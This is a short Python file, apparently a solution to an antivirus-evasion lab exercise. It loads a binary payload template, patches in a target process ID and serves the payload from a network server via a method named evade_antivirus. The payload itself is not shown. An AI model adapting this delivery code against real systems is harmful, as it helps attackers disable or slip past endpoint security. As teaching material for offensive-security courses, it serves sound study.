import assemble
import server
import struct


class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
    	fileContent = ""
    	with open("q3.template", mode='rb') as file: # b is important -> binary
    		fileContent = file.read()

    	string_to_replace = struct.pack('<I', 0x12345678)

    	pid_bin = struct.pack('<I',pid)

    	#replace all instances of "0x12345678" with the pid
	
    	res = fileContent.replace (string_to_replace, pid_bin)

    	return res
        

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

